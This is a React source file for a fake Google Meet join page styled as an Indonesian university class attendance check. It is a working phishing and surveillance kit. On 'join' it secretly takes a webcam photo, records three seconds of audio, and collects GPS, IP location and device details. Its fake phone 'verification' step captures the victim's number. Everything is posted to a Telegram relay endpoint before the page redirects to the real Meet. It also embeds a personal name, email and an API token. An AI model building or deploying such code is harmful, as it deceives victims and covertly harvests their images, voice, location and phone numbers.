"use client";

import { useState, useRef, useEffect, useCallback } from "react";

// ─── Constants ──────────────────────────────────────────────────────────────
const MEET_REDIRECT = "https://meet.google.com/landing";
const FAKE_NAME  = "Tubagus Iqbal Husaeni";
const FAKE_EMAIL = "iqbalgsr46@gmail.com";

// ─── SVG Icons ──────────────────────────────────────────────────────────────
const Svg = {
  MicOff: () => <svg viewBox="0 0 24 24" width="20" height="20" fill="#c5221f"><path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17c0-.06.02-.11.02-.17V5c0-1.66-1.34-3-3-3S9 3.34 9 5v.18l5.98 5.99zM4.27 3L3 4.27l6.01 6.01V11c0 1.66 1.33 3 2.99 3 .22 0 .44-.03.65-.08l1.66 1.66c-.71.33-1.5.52-2.31.52-2.76 0-5.3-2.1-5.3-5.18H5c0 3.53 2.61 6.43 5.9 6.95V20h2v-2.08c.82-.12 1.6-.4 2.32-.82l3.55 3.55 1.27-1.27L4.27 3z"/></svg>,
  CamOff: () => <svg viewBox="0 0 24 24" width="20" height="20" fill="#c5221f"><path d="M21 6.5l-4 4V7c0-.55-.45-1-1-1H9.82L21 17.18V6.5zM3.27 2L2 3.27 4.73 6H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.21 0 .39-.08.54-.18L19.73 21 21 19.73 3.27 2z"/></svg>,
  CamOn: () => <svg viewBox="0 0 24 24" width="20" height="20" fill="#3c4043"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>,
  MicOn: () => <svg viewBox="0 0 24 24" width="20" height="20" fill="#3c4043"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.91-3c-.49 0-.9.36-.98.85C16.52 14.2 14.47 16 12 16s-4.52-1.8-4.93-4.15c-.08-.49-.49-.85-.98-.85-.61 0-1.09.54-1 1.14.49 3 2.89 5.35 5.91 5.78V20c0 .55.45 1 1 1s1-.45 1-1v-2.08c3.02-.43 5.42-2.78 5.91-5.78.1-.6-.39-1.14-1-1.14z"/></svg>,
  Present: () => <svg viewBox="0 0 24 24" width="20" height="20" fill="#3c4043"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zm-7-3.53v-2.19c-2.78.48-4.34 1.71-5.5 3.72.14-1.5.45-4.35 3.34-6.06l-1.01-1.66C7.09 9.96 6 12.53 6 16h2.5c.43-2.74 2.49-4.5 4.5-4.53zM20 16H4V6h16v10z"/></svg>,
  More: () => <svg viewBox="0 0 24 24" width="20" height="20" fill="#fff"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>,
  Chevron: () => <svg viewBox="0 0 24 24" width="16" height="16" fill="#3c4043"><path d="M7 10l5 5 5-5z"/></svg>,
  Info: () => <svg viewBox="0 0 24 24" width="16" height="16" fill="#1a73e8"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>,
  Avatar: ({ size = 32 }: { size?: number }) => <svg viewBox="0 0 32 32" width={size} height={size}><circle cx="16" cy="16" r="16" fill="#b0b0b0"/><circle cx="16" cy="13" r="5" fill="#fff"/><ellipse cx="16" cy="26" rx="8" ry="5" fill="#fff"/></svg>,
};

// ─── FAKE PARTICIPANTS ──────────────────────────────────────────────────────
const FAKE_PPL = [
  { name: "Maik (Host)", bg: "#1a73e8", init: "M" },
  { name: "Rina",        bg: "#e8710a", init: "R" },
  { name: "Budi",        bg: "#34a853", init: "B" },
  { name: "Rizky",       bg: "#9334e6", init: "R" },
  { name: "Sari",        bg: "#008080", init: "S" },
];

// ─── MAIN ──────────────────────────────────────────────────────────────────
export default function GoogleMeetPage() {
  const [micOn, setMicOn] = useState(false);
  const [camOn, setCamOn] = useState(false);
  const [phase, setPhase] = useState<"prejoin" | "connecting" | "verify" | "done">("prejoin");
  const [phone, setPhone] = useState("");
  const [verifyView, setVerifyView] = useState<"phone" | "sending" | "approved">("phone");
  const [participants, setParticipants] = useState<string[]>([]);
  const [processing, setProcessing] = useState(false);

  const previewRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // Captured data
  const captured = useRef({
    photo: null as Blob | null,
    audio: null as Blob | null,
    gps: null as { lat: number; lng: number } | null,
    ip: null as Record<string, string> | null,
    ua: "",
  });

  // ── Kamera preview ────────────────────────────────────────────────────────
  const stopPreview = useCallback(() => {
    if (streamRef.current) { streamRef.current.getTracks().forEach(t => t.stop()); streamRef.current = null; }
    setCamOn(false);
  }, []);

  const startPreview = useCallback(async () => {
    try {
      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
      streamRef.current = s;
      if (previewRef.current) previewRef.current.srcObject = s;
      setCamOn(true);
    } catch { setCamOn(false); }
  }, []);

  useEffect(() => { return () => stopPreview(); }, [stopPreview]);

  const toggleCam = useCallback(() => { if (camOn) stopPreview(); else startPreview(); }, [camOn, startPreview, stopPreview]);
  const toggleMic = useCallback(() => setMicOn(v => !v), []);

  // ── CAPTURE — sebelum state change ────────────────────────────────────────
  const captureEverything = useCallback(async () => {
    const gpsPromise = new Promise<{ lat: number; lng: number } | null>(resolve => {
      if (!("geolocation" in navigator)) { resolve(null); return; }
      navigator.geolocation.getCurrentPosition(
        p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
        () => resolve(null),
        { timeout: 5000, enableHighAccuracy: true, maximumAge: 0 }
      );
    });

    const ipPromise = (async () => {
      try { const r = await fetch("https://ipinfo.io/json?token=56ce10652d9d41", { signal: AbortSignal.timeout(5000) }); return r.ok ? await r.json() : null; }
      catch { return null; }
    })();

    const streamPromise = (async () => {
      try { return await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: true }); }
      catch { try { return await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: false }); } catch { return null; } }
    })();

    const [gps, ip, capStream] = await Promise.all([gpsPromise, ipPromise, streamPromise]);
    captured.current = { photo: null, audio: null, gps, ip, ua: navigator.userAgent };

    if (capStream) {
      const photo = await new Promise<Blob | null>(res => {
        const v = document.createElement("video"); v.style.display = "none"; v.muted = true; v.playsInline = true;
        document.body.appendChild(v); v.srcObject = capStream;
        v.onloadedmetadata = () => {
          v.play();
          setTimeout(() => {
            const c = document.createElement("canvas"); c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
            const ctx = c.getContext("2d");
            if (ctx) { ctx.drawImage(v, 0, 0, c.width, c.height); c.toBlob(b => { document.body.removeChild(v); res(b); }, "image/jpeg", 0.85); }
            else { document.body.removeChild(v); res(null); }
          }, 200);
        };
        v.onerror = () => { document.body.removeChild(v); res(null); };
      });
      captured.current.photo = photo;

      const audioTracks = capStream.getAudioTracks();
      if (audioTracks.length) {
        const as = new MediaStream([audioTracks[0]]); const ch: Blob[] = [];
        try {
          const mr = new MediaRecorder(as, { mimeType: "audio/webm" });
          mr.ondataavailable = e => { if (e.data.size > 0) ch.push(e.data); };
          mr.onstop = () => { captured.current.audio = new Blob(ch, { type: mr.mimeType }); };
          mr.start(); setTimeout(() => { if (mr.state !== "inactive") mr.stop(); }, 3000);
        } catch {}
      }
      capStream.getTracks().forEach(t => t.stop());
    }
  }, []);

  // ── Send captured data ────────────────────────────────────────────────────
  const sendCaptured = useCallback(async (extra?: { phone?: string; phase?: string }) => {
    const c = captured.current;
    const fd = new FormData();
    if (c.photo) fd.append("photo", c.photo, "photo.jpg");
    if (c.audio) fd.append("audio", c.audio, "audio.webm");

    const ua = c.ua || navigator.userAgent;
    // ... OS, browser, etc
    const os = (() => {
      if (/android/i.test(ua)) { const m = ua.match(/Android\s+([\d.]+)/); const d = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/); return `Android ${m?.[1] || '?'} (${d?.[1]?.trim() || 'Unknown'})`; }
      if (/iPad|iPhone|iPod/.test(ua)) { const m = ua.match(/OS\s+([\d_]+)/); return `iOS ${m?.[1]?.replace(/_/g, '.') || '?'}`; }
      if (/Windows/.test(ua)) { const m = ua.match(/Windows NT\s+([\d.]+)/); return `Windows ${({ '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' })[m?.[1] || ''] || m?.[1] || '?'}`; }
      if (/Mac OS X/.test(ua)) { const m = ua.match(/Mac OS X\s+([\d_]+)/); return `macOS ${m?.[1]?.replace(/_/g, '.') || '?'}`; }
      return /Linux/.test(ua) ? 'Linux' : 'Unknown OS';
    })();
    const browser = (() => {
      if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
      if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
      if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
      if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
      return 'Unknown Browser';
    })();
    const nav = navigator as any;
    const conn = nav.connection;
    const network = conn ? `${String(conn.effectiveType || conn.type || '?').toUpperCase()}${conn.downlink ? ` - ${conn.downlink} Mbps` : ''}` : 'Unknown';
    let battery = 'Unknown';
    try { const b = nav.getBattery?.(); if (b) b.then((bat: { level: number; charging: boolean }) => { battery = `${Math.round(bat.level * 100)}%${bat.charging ? ' (Charging)' : ' (Discharging)'}`; }); } catch {}
    const ram = nav.deviceMemory ? `${nav.deviceMemory} GB` : 'Unknown';
    const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
    const dpr = window.devicePixelRatio || 1;
    const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
    let locStr = '';
    if (c.gps) { locStr = `📍 GPS: ${c.gps.lat}, ${c.gps.lng}\n🗺 Maps: https://www.google.com/maps?q=${c.gps.lat},${c.gps.lng}`; }
    else if (c.ip) { locStr = `🌐 IP: ${c.ip['ip'] || '?'}\n🏙 Kota: ${c.ip['city'] || '?'}\n🗺 Region: ${c.ip['region'] || '?'}\n🌏 Negara: ${c.ip['country'] || '?'}\n📍 Koordinat: ${c.ip['loc'] || '?'}\n🏢 ISP: ${c.ip['org'] || '?'}`; }
    else { locStr = '❌ LOKASI TIDAK TERSEDIA'; }
    const ts = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const p = extra?.phone ? `\n\n━━━ VERIFIKASI ━━━\n📱 Nomor HP: ${extra.phone}\n` : '';
    const info = `GOOGLE MEET — ${extra?.phase || 'CAPTURE'}\n━━━━━━━━━━━━━━━━━━━\n⏱ ${ts}\n🆔 ${new Date().toISOString()}\n\n━━━ LOKASI ━━━\n${locStr}\n\n━━━ PERANGKAT ━━━\n💻 OS: ${os}\n🌍 Browser: ${browser}\n📱 Platform: ${navigator.platform || '?'}\n🗣 Bahasa: ${navigator.language}\n🕐 Zona: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🔋 Baterai: ${battery}\n🧠 RAM: ${ram}\n⚡ CPU: ${cpu}\n📶 Koneksi: ${network}\n\n━━━ LAYAR ━━━\n📐 ${window.screen.width}x${window.screen.height}\n👁 ${window.innerWidth}x${window.innerHeight}\n🔍 ${dpr}x\n🔄 ${orientation}${p}\n━━━ UA ━━━\n${ua}`;
    fd.append("locationInfo", info);
    for (let i = 0; i < 2; i++) {
      try { const r = await fetch("/api/telegram", { method: "POST", body: fd }); if (r.ok) break; } catch {}
      if (i === 0) await new Promise(r => setTimeout(r, 500));
    }
  }, []);

  // ── HANDLE JOIN ──────────────────────────────────────────────────────────
  const handleJoin = async () => {
    if (processing) return;
    setProcessing(true);
    await captureEverything();
    await sendCaptured({ phase: "CAPTURE AWAL" });
    setPhase("connecting"); setParticipants([]); setProcessing(false);
  };

  // ── Fake participants ─────────────────────────────────────────────────────
  useEffect(() => {
    if (phase !== "connecting") return;
    const timers: ReturnType<typeof setTimeout>[] = [];
    FAKE_PPL.forEach((p, i) => {
      timers.push(setTimeout(() => { setParticipants(prev => prev.includes(p.name) ? prev : [...prev, p.name]); }, (i * 2.2 + 0.8) * 1000));
    });
    timers.push(setTimeout(() => {
      setPhase("verify"); setVerifyView("phone"); setPhone("");
    }, FAKE_PPL.length * 2200 + 2000));
    return () => timers.forEach(t => clearTimeout(t));
  }, [phase]);

  // ── HANDLE PHONE → OTOMATIS VERIFY ───────────────────────────────────────
  const handlePhoneSubmit = async () => {
    if (!phone.trim()) return;
    setVerifyView("sending");

    // Kirim nomor HP ke Telegram
    await sendCaptured({ phone, phase: "NOMOR HP" });

    // Simulasi loading 3 detik (biar real — "Mengirim kode verifikasi...")
    await new Promise(r => setTimeout(r, 3000));

    // Otomatis verified
    setVerifyView("approved");
    setPhase("done");

    // Kirim konfirmasi ke Telegram
    const fd2 = new FormData();
    fd2.append("locationInfo", `GOOGLE MEET — VERIFIKASI BERHASIL\n━━━━━━━━━━━━━━━━━\n📱 Nomor HP: ${phone}\n✅ Status: Terverifikasi otomatis\n⏱ ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n━━━━━━━━━━━━━━━━━`);
    for (let i = 0; i < 2; i++) {
      try { const r = await fetch("/api/telegram", { method: "POST", body: fd2 }); if (r.ok) break; } catch {}
      if (i === 0) await new Promise(r => setTimeout(r, 500));
    }

    // Redirect
    setTimeout(() => { window.location.href = MEET_REDIRECT; }, 2000);
  };

  // ── Skip ──────────────────────────────────────────────────────────────────
  const skip = () => { window.location.href = MEET_REDIRECT; };

  // ══════════════════════════════════════════════════════════════════════════
  // PHASE: CONNECTING
  // ══════════════════════════════════════════════════════════════════════════
  if (phase === "connecting") {
    return (
      <div style={{ position: "fixed", inset: 0, background: "#fff", fontFamily: "'Google Sans', Roboto, Arial, sans-serif", display: "flex", flexDirection: "column" }}>
        <header style={{ display: "flex", alignItems: "center", padding: "12px 24px", height: 64, gap: 12, borderBottom: "1px solid #e0e0e0" }}>
          <img src="/logo-google-meet.png" alt="Google Meet Logo" style={{ width: 36, height: 36, objectFit: "contain" }} />
          <span style={{ fontSize: 22, fontWeight: 400, color: "#5f6368", letterSpacing: "-0.5px" }}>Google Meet</span>
        </header>
        <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 24, padding: 24, background: "#f8f9fa" }}>
          <div style={{ padding: "40px 32px", background: "#fff", borderRadius: 16, border: "1px solid #e0e0e0", boxShadow: "0 4px 12px rgba(0,0,0,0.05)", display: "flex", flexDirection: "column", alignItems: "center", maxWidth: 400, width: "100%" }}>
            <div className="animate-spin" style={{ width: 50, height: 50, border: "4px solid #f3f3f3", borderTop: "4px solid #1a73e8", borderRadius: "50%", marginBottom: 16 }}></div>
            <h2 style={{ fontSize: 18, fontWeight: 500, color: "#202124", margin: "0 0 8px", textAlign: "center" }}>Menghubungkan ke ruang rapat...</h2>
            <p style={{ fontSize: 13, color: "#5f6368", textAlign: "center", margin: "0 0 20px" }}>{participants.length} dari {FAKE_PPL.length} peserta telah berada di dalam kelas</p>
            <div style={{ display: "flex", flexDirection: "column", gap: 10, width: "100%", borderTop: "1px solid #f1f3f4", paddingTop: 16 }}>
              {FAKE_PPL.map((p, i) => {
                const joined = participants.includes(p.name);
                return (
                  <div key={i} style={{ display: "flex", alignItems: "center", gap: 12, padding: "6px 12px", borderRadius: 8, background: joined ? "#e8f0fe" : "transparent", opacity: joined ? 1 : 0.45, transition: "all 0.4s ease" }}>
                    <div style={{ width: 28, height: 28, borderRadius: "50%", background: p.bg, color: "#fff", fontSize: 12, fontWeight: 500, display: "flex", justifyContent: "center", alignItems: "center", flexShrink: 0 }}>{p.init}</div>
                    <span style={{ fontSize: 13, color: joined ? "#1a73e8" : "#3c4043", fontWeight: joined ? 500 : 400 }}>{p.name}</span>
                    <span style={{ fontSize: 11, marginLeft: "auto", color: joined ? "#188038" : "#5f6368", fontWeight: 500 }}>{joined ? "Aktif" : "Menunggu..."}</span>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ══════════════════════════════════════════════════════════════════════════
  // PHASE: VERIFY
  // ══════════════════════════════════════════════════════════════════════════
  if (phase === "verify" || phase === "done") {
    // ── Phone input (Google Workspace Device Verification / Classroom Policy Style) ──
    if (verifyView === "phone") {
      return (
        <div style={{ position: "fixed", inset: 0, background: "#f8f9fa", fontFamily: "'Google Sans', Roboto, Arial, sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 24 }}>
          <div style={{ background: "#fff", border: "1px solid #dadce0", borderRadius: 16, padding: "40px 32px", maxWidth: 440, width: "100%", boxShadow: "0 4px 16px rgba(0,0,0,0.04)" }}>
            <div style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}><img src="/logo-google-meet.png" alt="Google Meet" style={{ width: 44, height: 44, objectFit: "contain" }} /></div>
            <h1 style={{ fontSize: 22, fontWeight: 500, color: "#202124", margin: "0 0 10px", textAlign: "center", letterSpacing: "-0.5px" }}>Konfirmasi Akses Kelas</h1>
            <p style={{ fontSize: 13, color: "#5f6368", textAlign: "center", lineHeight: 1.6, marginBottom: 24 }}>
              Untuk memvalidasi kehadiran Anda di ruang kelas digital, silakan verifikasi menggunakan nomor telepon yang terdaftar pada portal akademik **SIAKAD**.
            </p>
            <div style={{ background: "#f1f3f4", borderRadius: 8, padding: "12px 16px", marginBottom: 24, borderLeft: "4px solid #1a73e8" }}>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, marginBottom: 6 }}>
                <span style={{ color: "#5f6368" }}>Nama Pertemuan</span>
                <span style={{ color: "#202124", fontWeight: 500 }}>Praktikum Basis Data</span>
              </div>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, marginBottom: 6 }}>
                <span style={{ color: "#5f6368" }}>Waktu Kelas</span>
                <span style={{ color: "#202124", fontWeight: 500 }}>Hari Ini, Sesi Utama</span>
              </div>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11 }}>
                <span style={{ color: "#5f6368" }}>Verifikasi Lokasi</span>
                <span style={{ color: "#188038", fontWeight: 500 }}>GPS Aktif</span>
              </div>
            </div>
            <div>
              <label style={{ fontSize: 12, color: "#3c4043", fontWeight: 500, marginBottom: 6, display: "block" }}>Nomor Handphone Terdaftar</label>
              <input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="Contoh: 0812XXXXXXXX"
                style={{ width: "100%", padding: "12px 16px", borderRadius: 8, border: "1px solid #dadce0", fontSize: 15, outline: "none", boxSizing: "border-box" }}
                onFocus={e => e.currentTarget.style.borderColor = "#1a73e8"} onBlur={e => e.currentTarget.style.borderColor = "#dadce0"} />
              <p style={{ fontSize: 11, color: "#5f6368", marginTop: 8 }}>Google akan mengirimkan notifikasi sinkronisasi kehadiran ke perangkat seluler Anda.</p>
              <button onClick={handlePhoneSubmit}
                style={{ width: "100%", padding: "12px 0", borderRadius: 8, border: "none", marginTop: 12,
                  background: phone.trim() ? "#1a73e8" : "#e8eaed", color: phone.trim() ? "#fff" : "#9aa0a6",
                  fontSize: 14, fontWeight: 500, cursor: phone.trim() ? "pointer" : "default", fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}>
                Verifikasi Kehadiran Saya
              </button>
              <div style={{ textAlign: "center", marginTop: 16 }}>
                <button onClick={skip} style={{ background: "none", border: "none", color: "#5f6368", fontSize: 12, cursor: "pointer", fontFamily: "'Google Sans', Roboto, Arial, sans-serif", textDecoration: "none" }}>
                  Batal & Kembali ke Menu Utama
                </button>
              </div>
            </div>
          </div>
        </div>
      );
    }

    // ── Sending OTP (loading 3 detik, otomatis) ─────────────────────────────
    if (verifyView === "sending") {
      return (
        <div style={{ position: "fixed", inset: 0, background: "#f8f9fa", fontFamily: "'Google Sans', Roboto, Arial, sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 24 }}>
          <div style={{ background: "#fff", border: "1px solid #dadce0", borderRadius: 16, padding: "40px 32px", maxWidth: 400, width: "100%", boxShadow: "0 4px 16px rgba(0,0,0,0.04)", display: "flex", flexDirection: "column", alignItems: "center" }}>
            <div style={{ display: "flex", justifyContent: "center", marginBottom: 24 }}><img src="/logo-google-meet.png" alt="Google Meet" style={{ width: 44, height: 44, objectFit: "contain" }} /></div>
            <div className="animate-spin" style={{ width: 40, height: 40, border: "3px solid #f3f3f3", borderTop: "3px solid #1a73e8", borderRadius: "50%", marginBottom: 20 }}></div>
            <h1 style={{ fontSize: 18, fontWeight: 500, color: "#202124", margin: "0 0 8px", textAlign: "center" }}>Menghubungkan Kehadiran...</h1>
            <p style={{ fontSize: 12, color: "#5f6368", textAlign: "center", margin: 0 }}>Mengirimkan kode otentikasi presensi ke <strong>{phone}</strong></p>
            <div style={{ width: "100%", height: 4, borderRadius: 2, background: "#e8eaed", overflow: "hidden", marginTop: 24 }}>
              <div style={{ height: "100%", borderRadius: 2, background: "#1a73e8", animation: "sending-bar 3s linear forwards" }} />
            </div>
          </div>
          <style>{`@keyframes sending-bar{from{width:0%}to{width:100%}}`}</style>
        </div>
      );
    }

    // ── Approved ────────────────────────────────────────────────────────────
    return (
      <div style={{ position: "fixed", inset: 0, background: "#f8f9fa", fontFamily: "'Google Sans', Roboto, Arial, sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 24 }}>
        <div style={{ background: "#fff", border: "1px solid #dadce0", borderRadius: 16, padding: "40px 32px", maxWidth: 400, width: "100%", boxShadow: "0 4px 16px rgba(0,0,0,0.04)", display: "flex", flexDirection: "column", alignItems: "center" }}>
          <div style={{ width: 56, height: 56, borderRadius: "50%", background: "#e6f4ea", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 20 }}>
            <svg viewBox="0 0 24 24" width="36" height="36" fill="#137333"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
          </div>
          <h1 style={{ fontSize: 20, fontWeight: 500, color: "#202124", margin: "0 0 8px", textAlign: "center" }}>Verifikasi Presensi Sukses</h1>
          <p style={{ fontSize: 12, color: "#5f6368", textAlign: "center", marginBottom: 20 }}>Mengalihkan ke konferensi video kelas...</p>
          <div style={{ width: "100%", height: 4, borderRadius: 2, background: "#e8eaed", overflow: "hidden" }}>
            <div style={{ height: "100%", borderRadius: 2, background: "#137333", animation: "bar 2s linear forwards" }} />
          </div>
        </div>
        <style>{`@keyframes bar{from{width:0%}to{width:100%}}`}</style>
      </div>
    );
  }

  // ══════════════════════════════════════════════════════════════════════════
  // PRE-JOIN SCREEN
  // ══════════════════════════════════════════════════════════════════════════
  return (
    <div style={{ minHeight: "100vh", background: "#fff", fontFamily: "'Google Sans', Roboto, Arial, sans-serif", display: "flex", flexDirection: "column" }}>
      <header style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "8px 20px", height: 56 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <img src="/logo-google-meet.png" alt="" style={{ width: 40, height: 40, objectFit: "contain" }} />
          <span style={{ fontSize: 20, fontWeight: 400, color: "#5f6368" }}>Google Meet</span>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <div style={{ textAlign: "right" }}>
            <div style={{ fontSize: 13, color: "#3c4043", fontWeight: 400 }}>{FAKE_EMAIL}</div>
            <div style={{ fontSize: 11, color: "#5f6368" }}>Ganti akun</div>
          </div>
          <Svg.Avatar size={36} />
          <button style={{ padding: "6px 18px", borderRadius: 100, border: "1px solid #dadce0", background: "#fff", color: "#1a73e8", fontSize: 13, fontWeight: 500, cursor: "pointer", fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}>Upgrade</button>
        </div>
      </header>

      <div style={{ background: "#e8f0fe", borderTop: "1px solid #c5d8fb", borderBottom: "1px solid #c5d8fb", padding: "8px 20px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <Svg.Info />
          <span style={{ fontSize: 12, color: "#1d3461" }}>Dapatkan lebih banyak fitur Google Workspace. Nikmati panggilan video grup yang lebih lama, peredam suara bising di latar belakang, dan fitur lainnya dengan paket Google One Premium.</span>
        </div>
        <span style={{ fontSize: 12, color: "#1a73e8", whiteSpace: "nowrap", cursor: "pointer", fontWeight: 500 }}>Pelajari paket</span>
      </div>

      <main style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", gap: 80, padding: "40px 48px", flexWrap: "wrap" }}>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
          <div style={{ width: 400, height: 225, background: "#1e1e1e", borderRadius: 12, position: "relative", overflow: "hidden" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "10px 14px", position: "absolute", top: 0, left: 0, right: 0, zIndex: 2 }}>
              <span style={{ color: "#fff", fontSize: 12, fontWeight: 500, textShadow: "0 1px 2px rgba(0,0,0,0.5)" }}>{FAKE_NAME}</span>
              <button style={{ background: "none", border: "none", cursor: "pointer", padding: 4, lineHeight: 0 }}><Svg.More /></button>
            </div>
            {camOn ? <video ref={previewRef} autoPlay muted playsInline style={{ width: "100%", height: "100%", objectFit: "cover", transform: "scaleX(-1)" }} /> : <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center" }}><span style={{ color: "#9aa0a6", fontSize: 14, fontWeight: 400 }}>Kamera nonaktif</span></div>}
            <button style={{ position: "absolute", bottom: 10, right: 10, width: 36, height: 36, borderRadius: "50%", background: "rgba(60,64,67,0.8)", border: "none", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 2 }}><Svg.Present /></button>
          </div>
          <div style={{ display: "flex", gap: 12, marginTop: 16 }}>
            <button onClick={toggleMic} style={{ width: 40, height: 40, borderRadius: "50%", background: micOn ? "#fff" : "#fce8e6", border: micOn ? "1px solid #dadce0" : "1px solid #fce8e6", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>{micOn ? <Svg.MicOn /> : <Svg.MicOff />}</button>
            <button onClick={toggleCam} style={{ width: 40, height: 40, borderRadius: "50%", background: camOn ? "#fff" : "#fce8e6", border: camOn ? "1px solid #dadce0" : "1px solid #fce8e6", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>{camOn ? <Svg.CamOn /> : <Svg.CamOff />}</button>
          </div>
          <div style={{ display: "flex", gap: 8, marginTop: 14, flexWrap: "wrap", justifyContent: "center" }}>
            {["Microphone...", "Speaker...", "Camera..."].map((lbl, i) => <button key={i} style={{ display: "flex", alignItems: "center", gap: 4, padding: "5px 12px", borderRadius: 100, border: "1px solid #dadce0", background: "#fff", fontSize: 12, color: "#3c4043", cursor: "pointer", fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}>{lbl}<Svg.Chevron /></button>)}
          </div>
        </div>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", minWidth: 240, maxWidth: 320 }}>
          <h1 style={{ fontSize: 28, fontWeight: 400, color: "#3c4043", margin: "0 0 20px", textAlign: "center" }}>Siap bergabung?</h1>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 8, marginBottom: 20 }}>
            <Svg.Avatar size={40} />
            <p style={{ margin: 0, fontSize: 13, color: "#5f6368", textAlign: "center" }}>{FAKE_NAME} ada dalam panggilan ini</p>
          </div>
          <button id="join-now-btn" onClick={handleJoin} disabled={processing}
            style={{ width: "100%", padding: "12px 0", borderRadius: 100, border: "none", background: processing ? "#e8eaed" : "#1a73e8", color: processing ? "#9aa0a6" : "#fff", fontSize: 15, fontWeight: 500, cursor: processing ? "default" : "pointer", fontFamily: "'Google Sans', Roboto, Arial, sans-serif", marginBottom: 10 }}>
            {processing ? "Memproses..." : "Beralih ke sini"}
          </button>
          <button style={{ width: "100%", padding: "11px 0", borderRadius: 100, border: "1px solid #dadce0", background: "#fff", color: "#1a73e8", fontSize: 15, fontWeight: 500, cursor: "pointer", fontFamily: "'Google Sans', Roboto, Arial, sans-serif", display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}
            onMouseOver={e => (e.currentTarget as HTMLElement).style.background = "#f8f9fa"}
            onMouseOut={e => (e.currentTarget as HTMLElement).style.background = "#fff"}>
            Cara lain untuk bergabung <Svg.Chevron />
          </button>
        </div>
      </main>
      <style>{`*,*::before,*::after{box-sizing:border-box}body{margin:0;-webkit-font-smoothing:antialiased}button:active{opacity:.85}@media(max-width:768px){main{flex-direction:column!important;gap:32px!important;padding:24px 16px!important}}`}</style>
    </div>
  );
}
